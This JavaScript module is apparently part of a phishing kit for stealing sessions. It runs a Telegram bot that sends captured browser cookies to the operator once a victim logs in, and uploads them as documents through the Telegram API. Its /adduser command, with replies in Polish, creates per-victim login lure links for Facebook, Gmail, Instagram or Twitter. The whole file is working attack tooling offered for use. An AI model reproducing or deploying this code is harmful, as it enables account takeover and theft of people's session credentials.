// Telegram bot integration — mirrors the live activity log and sends
// cookies automatically once a login is detected. Entirely optional and
// best-effort: every export here is a silent no-op (and never throws) when
// TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID aren't configured, or when Telegram
// itself is unreachable, so the rest of the app never depends on it.

import { config } from './config.js';

function apiUrl(method) {
  return `https://api.telegram.org/bot${config.telegramBotToken}/${method}`;
}

export function isEnabled() {
  return Boolean(config.telegramBotToken && config.telegramChatId);
}

export async function sendMessage(text, options) {
  if (!isEnabled()) return;
  var body = { chat_id: config.telegramChatId, text, disable_web_page_preview: true };
  if (options && options.parseMode) body.parse_mode = options.parseMode;
  try {
    await fetch(apiUrl('sendMessage'), {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify(body),
    });
  } catch {
    /* best-effort notification */
  }
}

export async function sendDocument(buffer, filename, caption) {
  if (!isEnabled()) return;
  try {
    const boundary = '----spBoundary' + Date.now().toString(16);
    const parts = [];
    const text = (s) => parts.push(Buffer.from(s, 'utf8'));
    text(`--${boundary}\r\n`);
    text(`Content-Disposition: form-data; name="chat_id"\r\n\r\n${config.telegramChatId}\r\n`);
    if (caption) {
      text(`--${boundary}\r\n`);
      text(`Content-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n`);
    }
    text(`--${boundary}\r\n`);
    text(`Content-Disposition: form-data; name="document"; filename="${filename}"\r\n`);
    text(`Content-Type: application/octet-stream\r\n\r\n`);
    parts.push(buffer);
    text(`\r\n--${boundary}--\r\n`);
    await fetch(apiUrl('sendDocument'), {
      method: 'POST',
      headers: { 'content-type': `multipart/form-data; boundary=${boundary}` },
      body: Buffer.concat(parts),
    });
  } catch {
    /* best-effort */
  }
}

// One-off setup helper: finds the chat_id of whoever most recently messaged
// the bot, so the operator doesn't have to dig a numeric id out by hand.
export async function discoverChatId() {
  const res = await fetch(apiUrl('getUpdates') + '?limit=1&offset=-1');
  const data = await res.json();
  const upd = data.result?.[data.result.length - 1];
  return upd?.message?.chat?.id ?? upd?.channel_post?.chat?.id ?? null;
}

const PLATFORM_URLS = {
  facebook: 'https://www.facebook.com/',
  gmail: 'https://mail.google.com/mail/u/0/',
  instagram: 'https://www.instagram.com/',
  twitter: 'https://x.com/',
};

const PLATFORM_LABELS = {
  facebook: 'Facebook',
  gmail: 'Gmail',
  instagram: 'Instagram',
  twitter: 'Twitter / X',
};

async function replyTo(chatId, text) {
  try {
    await fetch(apiUrl('sendMessage'), {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text, disable_web_page_preview: true }),
    });
  } catch { /* best-effort */ }
}

async function handleAdduser(chatId, args, publicHost) {
  // args: ['<name>', '<platform>']
  if (args.length < 2) {
    await replyTo(chatId, '❌ Użycie: /adduser <imię> <platforma>\nPlatformy: facebook, gmail, instagram, twitter');
    return;
  }
  const name = args[0];
  const platform = args[1].toLowerCase();
  const startUrl = PLATFORM_URLS[platform];
  if (!startUrl) {
    await replyTo(chatId, `❌ Nieznana platforma: ${platform}\nDostępne: facebook, gmail, instagram, twitter`);
    return;
  }
  const platLabel = PLATFORM_LABELS[platform];
  const label = `${name} – ${platLabel}`;
  const id = `${name}-${platform}`.trim().toLowerCase().replace(/\s+/g, '-').replace(/[^a-z0-9_-]/g, '');
  if (!id) {
    await replyTo(chatId, '❌ Nazwa zawiera niedozwolone znaki.');
    return;
  }

  try {
    const { saveAccount, getAccount } = await import('./accounts.js');
    const { start } = await import('./browser.js');

    const existed = Boolean(await getAccount(id));
    if (!existed) {
      const { stop, wipeProfile } = await import('./browser.js');
      await stop(id).catch(() => {});
      await wipeProfile(id);
    }

    await saveAccount({ id, label, startUrl });
    await start(id, '127.0.0.1').catch(() => {});

    const saved = await getAccount(id);
    const ref = saved?.ref || '';
    const pinSuffix = config.pin ? `&p=${encodeURIComponent(config.pin)}` : '';
    const link = ref && publicHost ? `https://${publicHost}/account/login?ref=${ref}${pinSuffix}` : '(brak PUBLIC_HOST)';

    await replyTo(chatId, `✅ Konto "${label}" utworzone!\n🔗 Link: ${link}`);
  } catch (err) {
    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
  }
}

// Long-poll loop — receives /adduser commands from the admin's Telegram account.
// Runs in background; never throws (errors are logged and retried).
export function startCommandListener(publicHost) {
  if (!config.telegramBotToken) return;
  const adminId = config.telegramAdminId ? String(config.telegramAdminId) : '';

  let offset = 0;
  let running = true;

  async function poll() {
    while (running) {
      try {
        const url = apiUrl('getUpdates') + `?timeout=30&offset=${offset}&allowed_updates=["message"]`;
        const res = await fetch(url, { signal: AbortSignal.timeout(40_000) });
        if (!res.ok) { await new Promise(r => setTimeout(r, 5000)); continue; }
        const data = await res.json();
        for (const upd of data.result || []) {
          offset = upd.update_id + 1;
          const msg = upd.message;
          if (!msg?.text) continue;
          const fromId = String(msg.from?.id || '');
          const chatId = msg.chat?.id;
          // Only accept commands from the configured admin ID
          if (adminId && fromId !== adminId) continue;
          const text = msg.text.trim();
          if (!text.startsWith('/adduser')) continue;
          const parts = text.replace(/^\/adduser\S*\s*/, '').trim().split(/\s+/);
          await handleAdduser(chatId, parts, publicHost || config.publicHost);
        }
      } catch {
        await new Promise(r => setTimeout(r, 5000));
      }
    }
  }

  poll().catch(() => {});
  return () => { running = false; };
}
